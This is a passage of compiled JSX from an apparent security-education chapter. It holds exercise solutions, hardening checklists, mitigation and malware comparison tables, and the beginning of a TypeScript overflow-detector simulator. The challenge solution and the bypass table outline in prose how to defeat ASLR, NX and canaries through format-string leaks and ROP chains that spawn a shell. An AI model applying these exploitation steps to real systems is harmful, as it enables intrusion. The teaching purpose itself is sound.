      }), "\n1) EternalBlue (SMBv1 exploit, CVE-2017-0144). 2) EternalRomance (SMBv1 variant). 3) WMIC (Windows Management Instrumentation) for remote command execution. Also used PsExec and stolen credentials harvested via MimiKatz.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "application-problems",
      children: "Application Problems"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["For a binary compiled with ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-fstack-protector -pie -z now"
        }), " (Full RELRO, canary, PIE), describe an exploitation strategy. What vulnerability primitives would you need?"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nThis configuration has all major mitigations. Strategy: 1) Info leak of canary (format string or out-of-bounds read). 2) Info leak of code address (PIE bypass → calculate binary base). 3) Info leak of libc address (for system()). 4) ROP chain with gadgets from libc. Primitives needed: arbitrary read (leak canary, PIE base, libc base), then arbitrary write (overwrite return address with ROP chain).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You find a kernel-mode rootkit on a Linux server. Why can't you simply delete it? Describe the recovery process (three steps)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nDeleting the rootkit file does not remove it from kernel memory — the rootkit can also hide its files, processes, and network connections from userland tools. Recovery steps: 1) Quarantine the system (disconnect from network). 2) Preserve forensic evidence (RAM dump via LiME, disk image). 3) Rebuild from known-good backup or reinstall — do not try to clean a rooted kernel.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design a threat model (STRIDE) for a smart home IoT thermostat. List at least one threat per category."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nSpoofing: Attacker impersonates the cloud API to send fake temperature commands. Tampering: Attacker modifies firmware update in transit. Repudiation: No audit log of who changed temperature settings. Information Disclosure: Wi-Fi credentials or home occupancy patterns leaked via API. DoS: Repeated connection attempts drain battery. Elevation of Privilege: Guest user accesses admin thermostat settings.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "challenge-problem",
      children: "Challenge Problem"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Write a complete exploit for a 64-bit binary with no PIE but full ASLR + NX. The binary has a format string vulnerability in ", (0,jsx_runtime.jsx)(_components.code, {
          children: "printf(buf)"
        }), " followed by a stack buffer overflow ", (0,jsx_runtime.jsx)(_components.code, {
          children: "gets(buf2)"
        }), ". Your solution must: (a) leak libc address via format string, (b) calculate ", (0,jsx_runtime.jsx)(_components.code, {
          children: "system()"
        }), " offset, (c) build ROP chain with gadgets from the leaked libc, (d) redirect to ", (0,jsx_runtime.jsx)(_components.code, {
          children: "system(\"/bin/sh\")"
        }), "."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nStage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc address (e.g., `__libc_start_main` return address). Stage 2: Calculate libc base = leaked_addr - known_offset. Find system() and \"/bin/sh\" offsets. Stage 3: overflow buffer with: padding + pop_rdi gadget + &\"/bin/sh\" + system(). Use a `ret` gadget before system() for 16-byte stack alignment (movaps issue). See the extended pwntools example in this chapter.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "os-hardening-checklist",
      children: "OS Hardening Checklist"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Linux:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      className: "contains-task-list",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Remove unnecessary packages: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "apt-get autoremove --purge"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Apply sysctl hardening (ASLR, rp_filter, dmesg_restrict, ptrace_scope)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Enable SELinux/AppArmor in enforcing mode"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Configure firewall: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ufw default deny; ufw allow ssh"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " SSH: key-only auth, no root, custom port (optional)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Configure auditd: watch /etc, /var/log, /etc/shadow"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Password policy: PAM pwquality (14+ char, complexity)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Automatic security updates: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "unattended-upgrades"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Bootloader password: GRUB password"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " File integrity: AIDE or Tripwire"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Scan with Lynis and remediate suggestions"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Windows:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      className: "contains-task-list",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Apply latest Windows Updates"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Enable Windows Defender Real-time Protection"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Configure AppLocker (default deny, allow Program Files + Windows)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " UAC: Always notify"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " BitLocker: all drives encrypted"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Windows Firewall: default block inbound, allow only necessary"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " RDP: via VPN only, NLA, restricted user list"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Event log: increase log size, enable PowerShell logging (Event ID 4104)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Remove unnecessary roles and features"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Configure Windows Defender Exploit Guard (ASLR, DEP, CFG)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " LSA protection (RunAsPPL)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Disable SMBv1, LLMNR, NetBIOS over TCP/IP"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "buffer-overflow-defenses-comparison",
      children: "Buffer Overflow Defenses Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Defense"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mechanism"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Bypass"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Effectiveness"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Stack Canary"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Random value between buffer and return addr; check on return"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak of canary value, or fork-based brute-force"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (default in GCC/Clang)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Randomizes base addresses"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak (format string, ret2plt), 32-bit brute-force"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High on 64-bit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DEP/NX"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Marks stack/heap non-executable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ROP, ret2libc"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very high"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CFG"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validates indirect call targets via guard CFG table"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find unguarded call sites, or corrupt valid function pointer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (Windows 8.1+)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SEHOP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validates SEH chain before exception dispatch"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Corrupt chain to valid-appearing entry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SafeSEH"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Checks handler address is in registered module table"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use module without SafeSEH"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PIE"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Randomizes executable base address"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Info leak of binary base"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Full RELRO"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GOT read-only after initialization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Need other write target (heap pointer, stack var)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "malware-types-comparison-table",
      children: "Malware Types Comparison Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Propagation"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Payload"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detection"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Defense"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Virus"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File infection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Infected host files"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Varied"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signature AV"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AV, patch mgmt"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Worm"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network self-propagation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory or file"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS, dropper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network IDS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Segmentation, patch"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Trojan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Social engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry, services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backdoor, theft"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Behavioral EDR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User training, AppLocker"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing, exploits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shadow deletion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File I/O monitoring"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Offline backups, EDR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Rootkit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Post-exploit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel hooks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hide presence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure Boot, attestation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Botnet"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worm + exploit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2, DGA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS, spam, mining"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 traffic analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS sinkhole"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RAT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trojan delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-run"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remote control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network traffic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EDR, segmentation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Spyware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bundled, drive-by"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BHO, registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Keylogging, theft"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-spyware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Browser policies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Adware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bundled software"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry, toolbars"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unwanted ads"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PUP detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ad-blocker"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Fileless"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exploit, macro"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WMI, registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory payload"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Script block logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AMSI, logging"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "static-vs-dynamic-analysis",
      children: "Static vs Dynamic Analysis"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Static (SAST)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Dynamic (DAST)"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "When"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Implementation phase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Testing phase"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Source"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Analyzes source/binary"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tests running application"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "FP rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "FN rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low for known patterns"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Speed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fast"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slow"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Coverage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All theoretical paths"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only executed paths"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime bugs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot detect"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can detect"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Config issues"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot detect"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can detect"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Integration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pre-commit, CI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CI/CD with staging"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C/C++ tools"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Flawfinder, RATS, cppcheck"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASan, Valgrind, AFL"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Java tools"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FindSecBugs, SonarQube"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP ZAP, Burp"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ssdlc-phases",
      children: "SSDLC Phases"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Activities"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Deliverables"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Requirements"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security requirements, privacy analysis, abuse cases"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security requirements document"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Design"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Threat modeling (STRIDE), secure architecture review"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Threat model, architecture diagram"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Implementation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure coding, SAST scanning, code review"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Clean code, SAST report"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DAST, fuzzing, penetration testing, dependency scan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Test report, vulnerability log"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardened configs, secrets mgmt, immutable infra"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardened image, deployment plan"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Maintenance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Patch management, monitoring, incident response"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Patch log, IR playbook"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "typescript-implementations",
      children: "TypeScript Implementations"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "1-buffer-overflow-detector",
      children: "1. Buffer Overflow Detector"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The following TypeScript code simulates a stack frame analyzer that detects potential buffer overflow vulnerabilities by comparing input sizes against buffer capacities and identifying which critical memory regions (saved EBP, return address) would be overwritten."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "interface MemoryRegion {\n  address: string;\n  size: number;\n  permissions: string;\n  data: string;\n}\n\ninterface StackFrame {\n  functionName: string;\n  bufferSize: number;\n  bufferAddress: string;\n  returnAddress: string;\n  savedEbp: string;\n  locals: MemoryRegion[];\n  inputSize: number;\n}\n\ninterface OverflowVulnerability {\n  functionName: string;\n  type: 'stack_overflow' | 'heap_overflow' | 'SEH_overflow';\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  description: string;\n  overwrittenRegions: string[];\n  exploitability: string;\n  recommendation: string;\n}\n\nclass OverflowDetector {\n  detectStackOverflow(frame: StackFrame): OverflowVulnerability | null {\n    if (frame.inputSize <= frame.bufferSize) return null;\n    const overflowBytes = frame.inputSize - frame.bufferSize;\n    const overwritten: string[] = [];\n\n    // Determine which regions are overwritten based on overflow depth\n    if (overflowBytes > 0) {\n      overwritten.push(`Adjacent stack locals (${Math.min(overflowBytes, 12)} bytes past buffer)`);\n    }\n    if (overflowBytes > 12) {\n      overwritten.push(`Saved EBP (4 bytes) at ${frame.savedEbp} — base pointer corrupted`);\n    }\n    if (overflowBytes > 16) {\n      overwritten.push(`Return address (4 bytes) at ${frame.returnAddress} ← EIP control achieved!`);\n    }\n    if (overflowBytes > 20) {\n      overwritten.push(`Function arguments beyond return address`);\n    }\n\n    return {\n      functionName: frame.functionName,\n      type: 'stack_overflow',\n      severity: overflowBytes > 16 ? 'critical' : overflowBytes > 12 ? 'high' : 'medium',\n      description: `Buffer overflow in ${frame.functionName}: wrote ${frame.inputSize}B into ${frame.bufferSize}B buffer (${overflowBytes}B overflow)`,\n      overwrittenRegions: overwritten,\n      exploitability: overflowBytes > 16\n        ? 'Remote code execution — attacker controls EIP, can redirect to shellcode'\n        : overflowBytes > 12\n        ? 'Stack frame corrupted 